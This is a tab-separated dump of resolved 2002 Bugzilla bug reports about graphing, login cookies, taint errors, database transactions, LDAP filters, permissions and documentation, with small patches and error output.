120537%TAB%1011233146%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%dependancy graphs take forever to load, and are larger than necessary,Dependency graphs take forever to load, and are larger than necessary%TAB%dependancy graphs take forever to load, and are larger than necessary,Dependency graphs take forever to load, and are larger than necessaryIts not really an additional dependancy, as it would remove the requirement for 'webdot', or it could be coded as a parameter so the maintainer can decide whether to use 'dot' or 'webdot'.  On installations where Bugzilla and webdot would be installed on the same machine, it makes more sense to have Bugzilla generate the graphs itself, rather than using the external CGI webdot, which then pulls down the raw dependancy file via http.  webdot does not work over https either, meaning that a https installation needs to allow http connections thru to data/webdot/*.dot  Another option is to use the perl module Graphviz, which can output as_canon to create the raw files which Bugzilla currently builds manually, or as_(png|svg|etc) to create the images directly.
120543%TAB%1011234755%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Software error when entering a bug when not logged in & only one product%TAB%Software error when entering a bug when not logged in & only one productThe dependancy graphs on my bugzilla/webdot (1.7.14) installation take forever to load, and once loaded the image is twice the size it needs to be.  Bugzilla and Netscape 4.x both end up showing a black image after several failed attempts to scroll around the image, and IE does not even finish loading the image.
120603%TAB%1011262690%TAB%33168%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%[RFE URL field should  be clickable,[RFE] URL field should be intuitively clickable,URL field should be intuitively clickable%TAB%[RFE URL field should  be clickable,[RFE] URL field should be intuitively clickable,URL field should be intuitively clickablecould it be possible so that one can click somewhere that points to the value of the URL field? I am tired of copy/paste. or did I miss someting?  If one implement that using a link (e.g. a "go" on the right side of the text box), one has to think that the user can modify the URL field, thus not having the same URL in the textbox and in the link.
120660%TAB%1011276865%TAB%38354%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%long_list.cgi is missing a call to PutFooter() at the end of the file%TAB%long_list.cgi is missing a call to PutFooter() at the end of the filelong_list.cgi is missing a call to PutFooter() at the end of the file. It calls  PutHeader but doesn't finish the page with a PutFooter()
120686%TAB%1011285236%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%showdependencygraph.cgi does not allow multiple bugs in 'id'%TAB%showdependencygraph.cgi does not allow multiple bugs in 'id'showdependencygraph.cgi prompts the user to enter multiple bug numbers, however on sumbit it complains "The bug number is invalid. If you are trying to use QuickSearch, you need to enable JavaScript in your browser. To help us fix this limitation, look here."
120756%TAB%1011331174%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla-General%TAB%function use before <script> declaration considered harmful%TAB%function use before <script> declaration considered harmfulIE5.5 and 6 at the very least result in runtime errors if you do it.  The attachments manager triggers this a lot. a non harmful example is to click edit attachment as comment. you get a script error and no results.
120817%TAB%1011350109%TAB%42570%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Log Out and %commandmenu% in bannerhtml%TAB%Log Out and %commandmenu% in bannerhtmlWith %commandmenu% in bannerhtml, logging out from Bugzilla gives back the  relogin page with the Log Out on header and Log In on the footer.  Steps to reproduce: Add %commandmenu% in bannerhtml. Save the change. Navigate to any other page in  Bugzilla so that the command menu is added to the header. Select the Log Out  link from the FOOTER of the page. The relogin page is displayed with Log Out in  the header command menu and Log In in the footer.  Solution: This occurs because relogin.cgi calls delete $::COOKIE{"Bugzilla_login"}; after  calling PutHeader ("Relogin"); This means that the call to quietly_check_login () within GetCommandMenu() returns 1, and GetCommandMenu() displays the Log Out  option.  Here's a patch:  Index: relogin.cgi =================================================================== RCS file: /cvsroot/mozilla/webtools/bugzilla/relogin.cgi,v retrieving revision 1.10 diff -p -r1.10 relogin.cgi *** relogin.cgi 2000/01/18 14:41:00     1.10 --- relogin.cgi 2002/01/18 19:26:37 *************** Set-Cookie: Bugzilla_password= ; path=/; *** 34,39 **** --- 34,44 ----   Content-type: text/html    "; + + # delete the cookie before dumping the header so that it shows the user + # as logged out + delete $::COOKIE{"Bugzilla_login"}; +   PutHeader ("Relogin");    print "<B>Your login has been forgotten</B>.</P> *************** The cookie that was remembering your log *** 41,48 ****   do an action that requires a login, you will be prompted for it.   <p>   "; - - delete $::COOKIE{"Bugzilla_login"};    PutFooter(); 
121069%TAB%1011574061%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%Support database transactions.,Implement database transactions across Bugzilla%TAB%Support database transactions.,Implement database transactions across BugzillaSpun off of bug #98304.  Some databases support the notion of transactions, where an operation is considered to be atomic.  Apparently PostgreSQL has good support for them - MySQL I believe supports them but not well.  Transactions have two main benefits that I see:  - When a transaction contains a write operation is occuring, all other transactions will see the database either as is was at the start, or as it was at the end.  Failures of any sort will not result in a "corrupted" database where half a transaction was applied.  Bug #104589 makes this problem serious, but even if we fix that transactions are still a good idea for robustness purposes.  Computers can crash and software can have bugs.  - Read-only operations should never be denied - they can always use the last copy of the database that was before any other transactions begun, which is guaranteed to be consistent by the definition of transactions.  This means the shadow database is unnecessary as a performance improvement.  I don't see that introducing transactions into the codebase would be very difficult.  The API should be rather simple.  You need the calls BeginTransaction, CommitTransaction.  A shorthand call PerformTransaction that performs a list of SQL statements would also be good when you know up front what you want to do.  Essentially I think we should be able to add these calls in a bit at a time.  If the database in use does not support transactions there is no great loss.  In this case the calls will essentially be no-ops and there is no loss over what we had before.  I don't provide a RollbackTransaction call for this reason - not all databases will support it and we must not expect them to.  I also think BeginTransaction and CommitTransaction provide another benefit - it is a nice solution to bug #104589, users closing the window shouldn't terminate scripts.  A script should NEVER terminate during a transaction.  We can implement this notion of "transaction" even in databases that don't support transactions.  Indeed, I'm not sure we need to prevent script termination outside of transactions at all.  There is also the issue of locking.  Write locks are still probably useful in databases with transactions - without them a transaction can fail because it clashes in the typical "multiple writers" situation, and the transaction would need to be reapplied.  We need to decide whether the complexity of retrying is better than the possibility of deadlocks that comes with locking.  The former could be hidden away in a call such as PerformTransaction, but would need to be considered for CommitTransaction.  Read locks are unnecessary for transactions in PostgreSQL, since it will maintain an old copy of the data for the reader.  So if a traditional read lock was done on such a database, it would block writers when there is no particular need to.  I'm not sure whether PostgreSQL would block writers or just ignore ignore the locks.  If the former, we need to make sure read locks are only done for non-transaction mode.  So the question here is essential, is locking something that BeginTransaction worries about?  If read locks would block writers, it needs to be, as it can decide whether to do the read locks.  If we want to do retrying sometimes instead of write locks, the same applies.  The locks could be passed as a parameter to BeginTransaction and it would decide what to do.  Unfortunately it isn't feasible for BeginTransaction to automatically compute what to lock at the start if necessary since it doesn't know what is going to happen in the transaction - PerformTransaction is not constrained in that way and so perhaps could.
121074%TAB%1011582715%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Taint error after changing bug%TAB%Taint error after changing bugDo a query, then change one of the bugs. You'll get a taint error when loading the next bug. This is because we seciryt check our own version of the cookie.  I've fixed this (while bz was backing up) by just not displaying the bug. This is needed, because thats how the code works (OK, it doesn't have to work that way), but more improtantly it is valid for a bug on your list to move between groups, and when seeing bug a, you don't want to be told that you can't see bug b, just because it was in the list.  I've also printed the tainted string in the error message, to help with debugging.  afranke said that this patch worked, but didn't actually review it.
121110%TAB%1011602501%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%<Jake>   timeless_w98: It looks like longlist just don't recognize that it hasn't been feed any bug numbers%TAB%<Jake>   timeless_w98: It looks like longlist just don't recognize that it hasn't been feed any bug numbersnot receiving any bug numbers should be an error condition.
121112%TAB%1011602824%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%long_list.cgi generates bad links.%TAB%long_list.cgi generates bad links.steps. 1. load http://bugzilla.mozilla.org/buglist.cgi?bug_status=NEW&bug_status=ASSIGNED&bug_status=REOPENED&changedin=30&product=Browser&component=Security%3A+CAPS 2. click <long format> 3. click #2 or something from any comment (Eg: ------- Additional Comment #2 From Brendan Eich 2002-01-18 12:31 -------) 3' result: you get sent to the first comment named 2. 4. right click #2, select open in new window 4' result: you get a blank long listing. 4` is now bug 121110. 5. right click #2, select copy link location 6. share it with a friend, expecting it to be useful 6' it isn't, because it's http://bugzilla.mozilla.org/long_list.cgi#c2 [see 4]  my suggestion is that we fix 6.  The fact that 3 does something interesting is interesting but not very useful since long_list isn't portable (filed bug 121111)
121162%TAB%1011632505%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Remove booleanchart.html from CVS.%TAB%Remove booleanchart.html from CVS.booleanchart.html appears to be no longer linked to by anything, so we should remove it.
121170%TAB%1011641273%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%header template outputs empty <style> tag%TAB%header template outputs empty <style> tagIf there's no style paramater to the global/header template, then the template still prints out style tags. Trivial patch coming up.
121247%TAB%1011687076%TAB%8667%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%enter_bug comment templates%TAB%enter_bug comment templatesfollowing on from a post I made to the webtools group and the comments I got  back hows about .....  here a suggestion to some functionality that I think is useful ..........  I've implemented this on my system my manually changing the enter_bug.cgi so that each link on the "pick a product" page includes text like "&comment=TEMPLATE%20FOR%20EACH%20PRODUCT" at the end of the query string. This way I can end up with say the following automatically appearing in the comment field...  ---------------------- Database : Test-up : webserver on machine.myorg.com Some Other1 : Some Other2 :  Bug Details :  ----------------------  It would be nice to have another field in the product table to store the template for each product and then a little cgi to edit the templates...... the default template for each product would of course be blank.  myk@mozilla.org agreed that "Still, these templates could be useful for, among  other things, imposing the kind of structure on bug submissions that is called  for in b.m.o.'s bug writing guidelines or created by the Bugzilla helper."
121419%TAB%1011769709%TAB%42789%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%If multiple cookies exist, the least significant is assigned.%TAB%If multiple cookies exist, the least significant is assigned.Our group has 2 separate bugzilla installations, one public, at http://www.opennms.org/bugzilla/ and the other on our intranet at http://www.internal.opennms.org/bugzilla/.  When a user logs into the opennms.org public bugzilla, the "Bugzilla_logincookie" cookie is set.  When a user logs into the internal.opennms.org private bugzilla, it is set again, with a different cookie ID.  From that point on, logging into the internal.opennms.org bugzilla works, but only once.  What happens is the browser sends something similar to the following:    Cookie: Bugzilla_logincookie=603; Bugzilla_login=ben@opennms.org; \     Bugzilla_logincookie=246;  The first logincookie is from *.internal.opennms.org (most significant), the second from *.opennms.org.  The simple fix is to only accept the first cookie, since it should always be the most correct anyways.
121576%TAB%1011841516%TAB%42852%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%new user,bug_form.pl should indicate that you aren't logged in near the Commit button,show_bug should warn that you aren't logged in (you might not be able to make changes),fields should not be editable when viewing a bug if the user is not logged in%TAB%new user,bug_form.pl should indicate that you aren't logged in near the Commit button,show_bug should warn that you aren't logged in (you might not be able to make changes),fields should not be editable when viewing a bug if the user is not logged inIt is rather funny. I select and view a bug. The form seems to permit me to  make changes. I am denied permission after I submit. May be I feel this way as I am new to Bugzilla
121601%TAB%1011852893%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%relogin.cgi should redirect to the index page after telling you you've been logged out.,After logout, user should be redirected to the index page%TAB%relogin.cgi should redirect to the index page after telling you you've been logged out.,After logout, user should be redirected to the index pageWe should consider having relogin.cgi redirect to the index page after telling you you've been logged out and giving you sufficient time to read it.  Of course, have a "click here" link in case your browser doesn't redirect.  I saw this on someone's locally modified Bugzilla and it works well.
121735%TAB%1011888500%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Perl warning running checksetup.pl if a module has a non-numeric version number%TAB%Perl warning running checksetup.pl if a module has a non-numeric version numberChecking perl modules ... Checking for             DBI (v1.13)   ok: found v1.14 Checking for    Data::Dumper (any)     ok: found v2.101 Checking for      DBD::mysql (v1.2209) ok: found v2.0415 Checking for     Date::Parse (any)     ok: found v2.20 Checking for       AppConfig (v1.52)   ok: found v1.52 Checking for        Template (v2.06)   Argument "2.06d" isn't numeric in numeric lt (<) at ./checksetup.pl line 170 (#1)          (W numeric) The indicated string was fed as an argument to an operator that     expected a numeric value instead.  If you're fortunate the message     will identify which operator was so unfortunate.      ok: found v2.06d Checking for      Text::Wrap (v2001.0131) ok: found v2001.0929 Checking for       CGI::Carp (any)     ok: found v1.20
121741%TAB%1011892242%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%using quicksearch while bugzilla is shut down for backup gets "can't use xxx as a field name" error%TAB%using quicksearch while bugzilla is shut down for backup gets "can't use xxx as a field name" errorIf you visit http://bugzilla.mozilla.org/ and enter something in the quicksearch box and submit it while Bugzilla is down for it's nightly backup, you get the following error:  Can't use short_desc as a field name. If you think you're getting this in error, please copy the entire URL out of the address bar at the top of your browser window and email it to <109679@bugzilla.org>                                         Replace "short_desc" with the field of your choice, it varies depending on what you put in the quicksearch box.  This situation should cause the value of shutdownhtml to be displayed instead.  This means buglist.cgi is actually processing the form before it checks for shutdownhtml, which is a bad thing. :)
121800%TAB%1011929577%TAB%40864%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Bad COLUMNLIST cookike,Bad COLUMNLIST cookie%TAB%Bad COLUMNLIST cookike,Bad COLUMNLIST cookieIf I specify columns to display in the bug query result, the list of columns to be displayed is stored in COLUMNLIST cookie. The columns are separated by whitespace, which breaks standards, and also breaks sending of other cookies to the same domain (the COLUMNLIST cookie is sent, though).  This cookie breaks cookie handling for NS 4.x, current Mozilla (0.9.7), and IE6 as well.  For instance, on our Intranet, we have http://quake.intranet/bugzilla for bugs, and http://quake.intranet/manage for site management. Once the cookie COLUMNLIST is set up, cookies to http://quake.intranet/manage do not get send. If I delete that cookie, problem fixed.  Please either fix content of that cookie, or Mozilla :-) (and NS4, IE6 as well:-)
122087%TAB%1012119026%TAB%34176%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%"Error calling processmail (bug id is not an integer)" when creating attachment%TAB%"Error calling processmail (bug id is not an integer)" when creating attachmentOh, and when I added a comment to the bug 6 minutes later, the email I received contained both my comment from when I created the patch and my new comment:   ------- Additional Comments From jonasj@jonasj.dk 2002-01-27 09:03 ------- Created an attachment (id=66672)  --> (http://bugzilla.mozilla.org/showattachment.cgi?attach_id=66672) first attempt of a patch  Try this patch. It will add a "Make links open in new window" checkbox to Preferences|Advanced|Scripts & Windows. It is not the ideal solution since you won't be able to change this preference unless JavaScript is on, which you should be ablo to, since this doesn't have anything to do with JavaScript, but other than that, it works.  What do you think?  ------- Additional Comments From jonasj@jonasj.dk 2002-01-27 09:07 ------- Uhm, I just attached a patch to this bug, but I got the following error:  Attachment #66672 [details] [diff] to Bug # 78037 Created Error calling processmail (bug id is not an integer)  Anyway, there's a patch now. Check it out! :-)
122154%TAB%1012142669%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%change array indexes to numeric and clean up query.atml javascript ,change array indexes to numeric and clean up query.atml javascript,change array indexes to numeric and clean up query.html javascript,change array indexes to numeric and clean up query.atml javascript%TAB%change array indexes to numeric and clean up query.atml javascript ,change array indexes to numeric and clean up query.atml javascript,change array indexes to numeric and clean up query.html javascript,change array indexes to numeric and clean up query.atml javascriptIn the query.atml javascript, we use the product _name_ to index the component, version and milestone arrays. This wastes HTML and also makes manipulation of the contents a bit more involved.  There is also some cruft that can be removed from the code.
122301%TAB%1012232704%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%"edit attachment as comment" abuses xmlserialiser%TAB%"edit attachment as comment" abuses xmlserialiserI filed bug 121776, about edit attachment as comment truncating stuff. This was a WFM, but heikki mnetioned that we are abusing xmlserialiser by serialising non-xml documents.  The suggestion was to use XMLHttpRequest to grab the attachment, and then we can just insert it twice into the <iframe>, formatted as appropriate, using .responseText to get the actual response. In order to support browsers with no js, the existing code would be in a <noscript> tag. The edit attachment button shouldn't be displayed in that case, anyway, since it can't work w/o js. (Well, it could with a round trip to the server, but thats a separate issue)
122365%TAB%1012281364%TAB%36800%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Allow installation definable LDAP filters as a Parameter%TAB%Allow installation definable LDAP filters as a ParameterI wanted to restrict LDAP users to bugzilla.  Since most LDAP servers maintain a wealth of info about it's users, I wanted to filter on some of that information.  To this end, I have added a Parameter to defparams.pl called LDAPadditional.  This parameter should conform to the string representation for search filters as defined in RFC 2254 (http://www.faqs.org/rfcs/rfc2254.html).  When set, it is AND'd with the Param("LDAPmailattribute") to come up with a search.  For example, my variables are set as follows:  LDAPmailattribute = mail LDAPadditional    = (|(dept=A)(dept=B))  The above would search for the user with mail equal to the given LDAPusername, that is in either dept A OR dept B.  Code changes were the addition of a parameter in defparams.pl and filter code in CGI.pl.  I have been using this for several weeks now and I haven't hit any problems.  I will submit a patch following the bug submission.
122418%TAB%1012299236%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%setting attachment status fails%TAB%setting attachment status failsSoftware error: Attempted to send tainted string 'INSERT INTO attachstatuses (attach_id, statusid) VALUES (49, 1)' to the database at globals.pl line 216.  For help, please send mail to the webmaster (root@localhost), giving this error message and the time and date of the error. -  cvs tip, w/ and w/o the patch to remove the old attachment system. - Administer Attachment Statuses   Name Description Sort Key Product Action(s) needstesting needs testing 5 test Edit Delete Create
122636%TAB%1012386810%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Templatise colchange.cgi%TAB%Templatise colchange.cgiI have created a templatised version of colchange.cgi with colchange.tmpl template. Attaching patch for review.
122744%TAB%1012432643%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Charting fails taint checks%TAB%Charting fails taint checksTry to do a chart, and you'll get a taint error. Their are two problems:  First, we weren't detainting the product name after checking it. Secondly, the name of the file depend son input from the fields. For several reasons (see comments in the patch) we can't only allow valid inputs, so just do basic "letter+number" checks.
122897%TAB%1012496052%TAB%8793%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Moving bugs from Bugzilla to Bugscape overwrites comments entered%TAB%Moving bugs from Bugzilla to Bugscape overwrites comments enterednot sure if this is the correct product/component --pls reassign as needed.  when i've moved a bug from Bugzilla and Bugscape, i often enter a comment as to why. however, after doing the move, i've noticed that the comment i had entered wasn't there but instead replaced with an automated comment.  1. have a bug already entered in Bugzilla which you wish to move. 2. add a comment in the "Additional Comments" textarea. 3. click the "Move to Bugscape" button. 4. after the the bug has been processed, go back and view it.  results: the comment added in step (2) is not there. instead there's only the automated remark about who moved the bug to Bugscape, etc.  Bugzilla shouldn't be overwriting that comment: i often enter my reasons for moving the bug there.
122900%TAB%1012497034%TAB%8793%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts%TAB%allow user to turn off email notification for Unconfirmed bugs%TAB%allow user to turn off email notification for Unconfirmed bugsThis would be a *huge* benefit for XPApps/Navigator/XPToolkit.  About 80% of our bugs are not fixable (wfm,dup,wontfix,etc) , and many of those are unconfirmed. W e are drowining in worthless bugs, and could fix a lot more of the real defects if we  weren't getting notifications on bugs we can't even afford to read.
122922%TAB%1012510633%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Creating/Changing Bugs%TAB%CYEH_20000628_BRANCH Bug.pm,Allow Bug.pm to write to the database,Use Bug.pm to write changes and new bugs to the database%TAB%CYEH_20000628_BRANCH Bug.pm,Allow Bug.pm to write to the database,Use Bug.pm to write changes and new bugs to the databaseThis version of Bug.pm provides a useful Bugzilla API, although it suffers from the globals of Bugzilla.  Given the extent to which this branch improves Bug.pm, I would be great if only the current functionality of Bug.pm is required to be tested, the rest then able to be tested and fixed as developers find the need.
123030%TAB%1012561343%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%Move query.cgi JS to separate file.,Move query.cgi javascript to separate file.%TAB%Move query.cgi JS to separate file.,Move query.cgi javascript to separate file.Spun off from bug 96983 because of something myk also needs in bug 98801. This is a simple bug to remove the JS from the code and into a separate JS file. Ideally the JS is actually a .cgi file that generates the full JS for products for us, though this is not what 96983 asks for.  I would like to know what the best approach would be: make it a .cgi file and generate the JS component arrays on the fly, or make it the responsability of the including file (possibly a template) to generate them?
123077%TAB%1012573346%TAB%43370%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%Password change accepted with blank second field,token.cgi password change accepted with blank second field%TAB%Password change accepted with blank second field,token.cgi password change accepted with blank second fieldIf a user goes to change his/her password and leaves the second password field blank, Bugzilla will change the user's password to the contents of the first field. Reccomend changing line 838 of globals.pl (ValidatePassword function) from    elsif ( $matchpassword && ...) to    elsif ( defined($matchpassword) && ...)
123105%TAB%1012587029%TAB%7322%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%No tooltips in duplicates.cgi%TAB%No tooltips in duplicates.cgiWe need tooltips in duplicates.cgi
123113%TAB%1012596400%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation,bugzilla.org%TAB%Hackers' Guide - SQL Regexps%TAB%Hackers' Guide - SQL RegexpsWe should document the fact that SQL and Perl use different regexp languages, and give a quick summary of SQL regexp support.
123165%TAB%1012654703%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading%TAB%Permissions setup option for bugzilla_user==webserver_user,Permissions setup option for bugzilla_user==webserver_user (suexec)%TAB%Permissions setup option for bugzilla_user==webserver_user,Permissions setup option for bugzilla_user==webserver_user (suexec)Bugzilla already allows for the following situations: A) bugzilla and apache are different users, and they are not in the same group    -> several important directories are made world writable B) bugzilla and apache are different users, but they are in the same group    -> several important directories are made group writable  In our installation, we have the following case: C) bugzilla and apache are the same user.    -> everything should be writable only by the user;       no write permissions for group or others are necessary  For some reason, I really needed to hack bugzilla to do this: Sometimes, on our (NFS-shared) file systems files writable by the group "nobody" are mysteriously deleted, and our sysadmin hasn't found the responsible process or user yet.  Since the data directory was affected, this caused the params file to disapper, among others (collected stats, .htaccess files, ...). The missing params file caused all sorts of badness, most noticeably: Bugzilla displayed the mozilla banner instead of our own, all products were suddenly visible to everybody (since use*groups was suddently off), and the QA contact field was missing.   After I changed permission settings from 777 or 775 to 755 and permission settings from 666 or 664 to 644, this problem did not occur any more. Thus I'm now filing this bug to make this an "officially supported" installation option. Or are there any problems with this?
123394%TAB%1012823671%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%add Graphviz/webdot information to bugzilla guide%TAB%add Graphviz/webdot information to bugzilla guideBug 120537 changes the way in which dependancy graphs are delivered, and removed a lot of explainitory information from the related param.  Some information that should get documented: 1) Download location for graphviz 2) Download location for webdot 3) Restrictions of webdot 3.1) HTTPS and HTTP/1.1 do not work. 4) Any relavent information from the previous param text: "This is the URL prefix that is common to all requests for webdot.  The <a href=\"http://www.research.att.com/~north/cgi-bin/webdot.cgi\">webdot package</a> is a very swell thing that generates pictures of graphs.  If you have an installation of bugsplat that hides behind a firewall, then to get graphs to work, you will have to install a copy of webdot behind your firewall, and change this path to match.  Also, webdot has some trouble with software domain names, so you may have to play games and hack the %urlbase% part of this.  If this all seems like too much trouble, you can set this paramater to be the empty string, which will cause the graphing feature to be disabled entirely." 5) There may be some need to explain the means by which dependancy graphs can now be generated: "It is possible to show graphs of dependent bugs. You may set this parameter to any of the following: <ul> <li>A complete file path to 'dot' (part of <a href="http://www.graphviz.org">GraphViz</a>) will generate the graphs locally.</li> <li>A URL prefix pointing to an installation of the <a href="http://www.research.att.com/~north/cgi-bin/webdot.cgi">webdot package</a> will generate the graphs remotely.</li> <li>A blank value will disable dependency graphing.</li> </ul> The default value is a publically-accessible webdot server."
123565%TAB%1012894468%TAB%43575%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,Documentation%TAB%Change multiple bugs after Query should include "Close",Add to FAQ: Why can't I close bugs from "Change Several Bugs at Once" ?%TAB%Change multiple bugs after Query should include "Close",Add to FAQ: Why can't I close bugs from "Change Several Bugs at Once" ?After one performs a query, an option appears at the bottom of the query to  change multiple bugs at once.  When you hit that button, check boxes appear  next to all bugs in the query.  At the bottom of the page, are the data items  that you can change for all bugs you have checked.  However, "Close" is NOT one of these options, but it should be.
123740%TAB%1012931673%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Add <label> to email prefs%TAB%Add <label> to email prefsWe need <label> support for all those email preferences.
123760%TAB%1012941712%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation,bugzilla.org%TAB%Reorganise Hackers' Guide.%TAB%Reorganise Hackers' Guide.I think the hackers' guide should be reorganised into sections on technologies, ie.  Web Pages (HTML/JS/Cookies) SQL CGI Design Coding Style Problems To Avoid  etc.
123763%TAB%1012942118%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation,bugzilla.org%TAB%Hackers' Guide - Good HTML%TAB%Hackers' Guide - Good HTMLOur HTML requirements for new stuff are as follows:  HTML 4.01 Transitional Compliant + Valid XHTML : Need pointers to relevant documents on how to do this.  Use <LABEL> on checkboxes.
123957%TAB%1013001174%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%run checksetup.pl non-interactively (for use with cron jobs on test installs)%TAB%run checksetup.pl non-interactively (for use with cron jobs on test installs)We should be able to run checksetup.pl from a cron job without it stalling to ask for input.  If this is accomplished by passing it command-line parameters this is fine.  Having it not output anything unless there are errors, then output instructions to run it manually to STDERR (which would be mailed to the cron job owner by crond) if input is needed would probably be best.
124127%TAB%1013055102%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Software error when sorting buglist by "Opened" date%TAB%Software error when sorting buglist by "Opened" dateSorting a buglist by "Opened" date doesn't work:  Software error:  Invalid order: unix_timestamp(bugs.creation_ts), map_assigned_to.login_name, bugs.bug_id at /home/bugzilla/apache/htdocs/buglist.cgi line 1161.   With the new templatized buglist.cgi from bug 103778 the message is different:  Software error:  SELECT DISTINCT bugs.bug_id, bugs.groupset, unix_timestamp(bugs.creation_ts), bugs.bug_type, bugs.bug_severity, bugs.priority, map_assigned_to.login_name, bugs.bug_status, bugs.resolution, bugs.product, bugs.component, bugs.target_milestone, bugs.short_desc FROM bugs, profiles map_assigned_to, profiles map_reporter LEFT JOIN profiles map_qa_contact ON bugs.qa_contact = map_qa_contact.userid LEFT JOIN cc selectVisible_cc ON bugs.bug_id = selectVisible_cc.bug_id AND selectVisible_cc.who = 5 WHERE ((bugs.groupset & 31736) = bugs.groupset OR (bugs.reporter_accessible = 1 AND bugs.reporter = 5) OR (bugs.assignee_accessible = 1 AND bugs.assigned_to = 5) OR (bugs.qacontact_accessible = 1 AND bugs.qa_contact = 5) OR (bugs.cclist_accessible = 1 AND selectVisible_cc.who = 5 AND not isnull(selectVisible_cc.who))) AND bugs.assigned_to = map_assigned_to.userid AND bugs.reporter = map_reporter.userid AND (bugs.bug_status = 'UNCONFIRMED' OR bugs.bug_status = 'NEW' OR bugs.bug_status = 'ASSIGNED' OR bugs.bug_status = 'REOPENED') GROUP BY bugs.bug_id ORDER BY unix_timestamp(bugs.creation_ts), map_assigned_to.login_name, bugs.bug_id : You have an error in your SQL syntax near 'unix_timestamp(bugs.creation_ts), map_assigned_to.login_name, bugs.bug_id ' at line 6 at globals.pl line 249.
124174%TAB%1013069431%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Email Notifications%TAB%processmail calls should go through a single sub,processmail should be a package%TAB%processmail calls should go through a single sub,processmail should be a packageIt would be good if globals.pl defined a sub CallProcessMail which contained  the system() call, so that all the separate files could just call that single  sub. In a Win32 installation it's many times necessary to whip up several  parameters to the system call, and it's rather cumbersome to run around the  source files pasting the new code everywhere. Combining the calls into a single  place would help changing the system call syntax.  I currently use the following:   sub CallProcessMail {  system("d:\\perl\\bin\\perl.exe", "-I\\\\t1\\\\s1\\bugzilla\\", "\\\\t1\\\\s1 \\bugzilla\\processmail.pl", @_); }
124274%TAB%1013088946%TAB%1069%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%RFE: make link names in "Actions" footer customizable.%TAB%RFE: make link names in "Actions" footer customizable.Curretnly, the only way to customize the "Actions" part of the footer (for example, to replace "New" with "Enter New Bug") is to edit the CGI.pl, it would be nice if this could be more easily customizable...
124405%TAB%1013152576%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading%TAB%Remove direct AppConfig dependency.%TAB%Remove direct AppConfig dependency.The AppConfig dependency was a hack to deal with a bad TT package.  Now we've upped the TT requirement to 2.06 we should be able to remove it I believe.
